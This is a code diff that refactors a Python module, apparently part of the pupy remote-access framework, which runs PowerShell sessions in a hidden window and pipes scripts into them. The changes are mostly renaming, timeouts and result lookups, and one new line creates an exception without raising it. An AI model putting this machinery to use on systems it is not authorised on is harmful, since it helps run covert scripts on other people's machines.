@@ -15,13 +15,19 @@ import codecs
 class PowerHostUninitialized(Exception):
     pass
 
-class PowerShellUninitialized(Exception):
+class PowershellUninitialized(Exception):
     pass
 
-class PowerShellInitializationFailed(Exception):
+class PowershellInitializationFailed(Exception):
     pass
 
-class PowerShellV2NotInstalled(Exception):
+class PowershellContextUnregistered(Exception):
+    pass
+
+class PowershellV2NotInstalled(Exception):
+    pass
+
+class PowershellTimeout(Exception):
     pass
 
 class Request(object):
@@ -37,6 +43,10 @@ class Request(object):
         self._completed = False
 
     @property
+    def rid(self):
+        return self._rid
+
+    @property
     def expression(self):
         return self._expression
 
@@ -46,7 +56,9 @@ class Request(object):
 
     @property
     def result(self):
-        self._event.wait(timeout=self._timeout)
+        if not self._event.wait(timeout=self._timeout):
+            raise PowershellTimeout(self._rid)
+
         result = self._result
 
         if self._rid in self._storage:
@@ -88,12 +100,11 @@ class Request(object):
             self._event.set()
 
 
-class PowerShell(threading.Thread):
+class Powershell(threading.Thread):
     def __init__(self, host, name, content, try_x64=False, daemon=False, width=None, v2=True):
-        super(PowerShell, self).__init__()
+        super(Powershell, self).__init__()
         self.daemon = True
 
-        self._content = zlib.compress(content) if content else None
         self._try_x64 = try_x64
         self._completed = threading.Event()
         self._initialized = False
@@ -109,7 +120,7 @@ class PowerShell(threading.Thread):
         self._v2 = v2
 
         if try_x64:
-            native = ur'C:\Windows\SysNative\WindowsPowerShell\v1.0\powershell.exe'
+            native = ur'C:\Windows\SysNative\WindowsPowershell\v1.0\powershell.exe'
             if os.path.exists(native):
                 self._executable = native
 
@@ -117,13 +128,13 @@ class PowerShell(threading.Thread):
             self._executable, u'-W', u'hidden', u'-I', u'Text', u'-C', u'-'
         ]
 
-        self._initialize()
+        self._initialize(content)
 
     @property
     def v2(self):
         return self._v2
 
-    def _initialize(self):
+    def _initialize(self, content):
         if self._pipe:
             return
 
@@ -155,26 +166,26 @@ class PowerShell(threading.Thread):
 
         if 'Version v2.0.50727 of the .NET Framework is not installed'.encode('UTF-16LE') in data:
             self.stop()
-            raise PowerShellV2NotInstalled()
+            raise PowershellV2NotInstalled()
 
         elif not data or not preamble_complete in data:
             print "First line: ", repr(data)
             print '.NET Framework is not installed' in data
             self.stop()
-            raise PowerShellInitializationFailed()
+            raise PowershellInitializationFailed()
 
-        if not self._content:
+        if not content:
             return
 
-        content = zlib.decompress(self._content)
+        self.load(content)
+
+    def load(self, content):
         content = re.sub('Write-Host ', 'Write-Output ', content, flags=re.I)
-
         self._invoke_expression(content)
-
 
     def _invoke_expression(self, content, dest=None, pipe=None):
         if not self._pipe:
-            raise PowerShellUninitialized()
+            raise PowershellUninitialized()
 
         if not content:
             return
@@ -273,13 +284,19 @@ class PowerShell(threading.Thread):
             sol_at+len(SOL):-(len(EOL)+1)
         ].strip(), response[:sol_at]
 
-    def execute(self, expression, async=False, timeout=None):
+    def execute(self, expression, async=False, timeout=None, wait=None):
         if self._daemon:
             async = True
 
             if self._daemon_request:
                 self._execute(expression)
                 return self._daemon_request
+
+        if timeout:
+            if wait is None:
+                wait = not async
+
+            async = True
 
         if self._queue:
             request = Request(
@@ -295,7 +312,8 @@ class PowerShell(threading.Thread):
 
             self._rid += 1
             self._queue.put(request)
-            if async:
+
+            if async and not wait:
                 return request
             else:
                 return request.result
@@ -304,7 +322,7 @@ class PowerShell(threading.Thread):
             self._queue = Queue.Queue()
             self._host.results[self._name] = {}
             self.start()
-            return self.execute(expression, async, timeout)
+            return self.execute(expression, async, timeout, wait)
 
         else:
             return self._execute(expression)
@@ -358,18 +376,27 @@ class PowerHost(object):
             self._powershells[name].stop()
 
         try:
-            self._powershells[name] = PowerShell(
+            self._powershells[name] = Powershell(
                 self, name, content, try_x64, daemon, width, v2
             )
 
-        except PowerShellV2NotInstalled:
+        except PowershellV2NotInstalled:
             self._v2 = False
-            self._powershells[name] = PowerShell(
+            self._powershells[name] = Powershell(
                 self, name, content, try_x64, daemon, width, False
             )
 
-    def registered(self, name):
-        return name in self._powershells
+    def load(self, name, content):
+        if not name in self._powershells:
+            raise PowershellUninitialized()
+
+        self._powershells[name].load(content)
+
+    def registered(self, name=None):
+        if name:
+            return name in self._powershells
+        else:
+            return self._powershells.keys()
 
     def unregister(self, name):
         if not name in self._powershells:
@@ -417,10 +444,13 @@ class PowerHost(object):
     def stopped(self):
         return not self._powershells
 
-def loaded(name):
+def loaded(name=None):
     powershell = pupy.manager.get(PowerHost)
     if not powershell:
-        return False
+        if not name:
+            return []
+        else:
+            return False
 
     return powershell.registered(name)
 
@@ -431,7 +461,10 @@ def load(name, content, force=False, try_x64=False, daemon=False, width=None, v2
     if not powershell:
         raise PowerHostUninitialized()
 
-    powershell.register(name, content, force, try_x64, daemon, width, v2)
+    if loaded(name) and not force:
+        powershell.load(name, content)
+    else:
+        powershell.register(name, content, force, try_x64, daemon, width, v2)
 
 def unload(name):
     powershell = pupy.manager.get(PowerHost)
@@ -457,13 +490,34 @@ def call(name, expression, async=False, timeout=None, content=None, try_x64=Fals
         if content:
             unload(name)
 
+def result(name, rid):
+    rid = int(rid)
+
+    powershell = pupy.manager.get(PowerHost)
+    if not powershell:
+        raise PowerHostUninitialized()
+
+    if not loaded(name):
+        PowershellContextUnregistered()
+
+    results = powershell.results
+    if not name in results or not rid in results[name]:
+        return None
+
+    result = results[name][rid]
+    del results[name][rid]
+
+    return result
+
 @property
 def results():
     powershell = pupy.manager.get(PowerHost)
     if not powershell:
         raise PowerHostUninitialized()
 
-    return powershell.results
+    return {
+        ctx:results.keys() for ctx, results in powershell.results.iteritems()
+    }
 
 def stop():
     pupy.manager.stop(PowerHost)
